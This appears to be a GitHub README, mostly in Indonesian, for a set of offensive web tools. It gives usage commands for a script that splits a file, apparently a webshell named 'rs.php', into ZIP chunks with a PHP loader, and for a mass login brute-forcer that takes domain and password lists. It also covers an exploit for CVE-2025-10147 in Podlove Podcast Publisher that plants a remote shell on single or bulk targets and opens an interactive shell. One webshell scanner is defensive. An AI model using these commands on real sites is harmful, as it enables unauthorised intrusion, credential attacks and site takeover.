# Tools
This is some tools :)

============================================================


**Pecah.py**

Tools untuk memecah 1 file menjadi beberapa file dan dijadikan ZIP, lalu akan memberikan script PHP untuk pemanggilan.

how to use :

	 python3 pecah.py --input (File Awal) --zip (Nama File Zip) --loader (Nama File Pemanggil) --lines (Jumlah Baris dalam 1 File)

Example :

	 python pecah.py --input rs.php --zip rs2.zip --loader rs2.php --lines 5

=============================================================


**Shell_scanner/scan.php**

Script ini untuk melihat file php, phtml, php5 etc dalam rentan waktu tertentu. lengkap dengan path

note : Kekurangannya untuk deteksi low, medium, risk masih belom karena webshell masih dianggap low risk



=============================================================


**Brute/brute.py**

script bruteforce -> pass.txt untuk kombinasi password, ngambil username dari user yang ada. 


Example:

	python3 brute.py -l domains.txt -p passwords.txt -o hasil.txt -t 10



=============================================================

**CVE-2025-10147_Podlove Podcast Publisher**

Script ini untuk kerentanan di **CVE-2025-10147** dimana cara menjalankannya seperti di bawah !


Single Target:

	python3 exploit.py -u (target) -s (shell url) --filename (shell name)

Mass / Bulk Target:

	python3 exploit.py -f (file target) -s (shell url) -o (result target) --filename (shell name) -t (threads)

Interactive Shell :

	python3 exploit.py --shell-url (target with full shell url)
